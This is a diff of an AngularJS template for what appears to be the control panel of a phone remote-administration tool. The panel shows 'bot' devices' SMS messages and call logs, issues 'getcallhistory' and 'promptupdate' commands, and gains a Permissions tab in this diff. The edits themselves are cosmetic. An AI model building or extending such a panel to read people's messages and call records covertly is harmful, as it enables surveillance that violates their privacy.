@@ -1,8 +1,9 @@
 <h1>
-  
-  <span class="text-success" ng-show="bot.status">Device: {{bot.device}} (online)</span>
-  <span class="text-danger" ng-show="!bot.status">Device: {{bot.device}} (offline)</span>
+  <span ng-show="bot.status && !bot.updated">Device: {{bot.device}}</span>
+  <span class="text-success" ng-show="bot.status && bot.updated">Device: {{bot.device}} (online)</span>
+  <span class="text-danger" ng-show="!bot.status && bot.updated">Device: {{bot.device}} (offline)</span>
 </h1>
+<p>Last seen {{bot.updated | amCalendar:referenceTime:formats}}</p>
 <!-- <p class="text-success" ng-show="bot.status">ONLINE</p>
 <p class="text-danger" ng-show="!bot.status">OFFLINE</p> -->
 <uib-tabset active="active">
@@ -24,10 +25,10 @@
       <div class="panel-body">
         <div class="list-group">
           <div class="list-group-item" ng-repeat="msg in messages | orderBy: 'date'" ng-class="msg.type*1 === 2? 'text-info' : ''">
-            {{msg.type*1 === 1 ? '(Received)' : '(Sent)' }} {{msg.name}} {{msg.phone}} <br>
-            <b>{{msg.message}}</b>
+            {{msg.type*1 === 1 ? '(Received)' : '(Sent)' }} {{msg.name}} {{msg.phone}}
             <br>
-            {{ msg.date | amCalendar:referenceTime:formats}}
+            <b>{{msg.message}}</b>
+            <br> {{ msg.date | amCalendar:referenceTime:formats}}
             <!-- {{msg.date}} -->
           </div>
           <p ng-show="messages.length === 0">No History Yet</p>
@@ -42,7 +43,7 @@
         <input class="form-control" type="number" name="number" ng-model="num_call_logs" required>
       </div>
       <div class="form-group">
-        <button  ng-disabled="callLogsForm.$invalid" class="btn btn-primary" ng-click="addCommand('getcallhistory', num_call_logs)">Get Call History</button>
+        <button ng-disabled="callLogsForm.$invalid" class="btn btn-primary" ng-click="addCommand('getcallhistory', num_call_logs)">Get Call History</button>
       </div>
     </form>
     <hr>
@@ -53,11 +54,10 @@
       </div>
       <div class="panel-body">
         <div class="list-group">
-          <div class="list-group-item" ng-repeat="log in callLogs | orderBy: 'date'" ng-class="getLogClass(log)">
+          <div class="list-group-item" ng-repeat="log in callLogs | orderBy: 'date'" ng-class="callLogClass(log)">
             <span ng-if="log.type*1===1">(Incoming)</span>
             <span ng-if="log.type*1===2">(Outgoing)</span>
-            <span ng-if="log.type*1===3">(Missed)</span>
-            {{log.name}} {{log.phone}}
+            <span ng-if="log.type*1===3">(Missed)</span> {{log.name}} {{log.phone}}
             </br>
             {{log.date | amCalendar:referenceTime:formats}}</br>
             <!-- {{log.date}}</br> -->
@@ -75,9 +75,29 @@
         <input class="form-control" type="text" name="url" ng-model="update_url" required>
       </div>
       <div class="form-group">
-        <button  ng-disabled="updateForm.$invalid" class="btn btn-primary" ng-click="addCommand('promptupdate', update_url)">Prompt Update</button>
+        <button ng-disabled="updateForm.$invalid" class="btn btn-primary" ng-click="addCommand('promptupdate', update_url)">Prompt Update</button>
       </div>
     </form>
+  </uib-tab>
+  <uib-tab index="4" heading="Permissions">
+    <table class="table">
+      <thead>
+        <tr>
+          <th>Permission</th>
+          <th>Status</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr ng-repeat="perm in permissions">
+          <th>{{perm.permission}}</th>
+          <th>
+            <span class="text-success" ng-if="perm.granted">Granted</span>
+            <span class="text-danger" ng-if="!perm.granted">Denied</span>
+          </th>
+        </tr>
+      </tbody>
+    </table>
+    <p ng-show="permissions.length === 0">No info to show</p>
   </uib-tab>
   <uib-tab index="3" heading="Pending Commands">
     <div class="list-group">
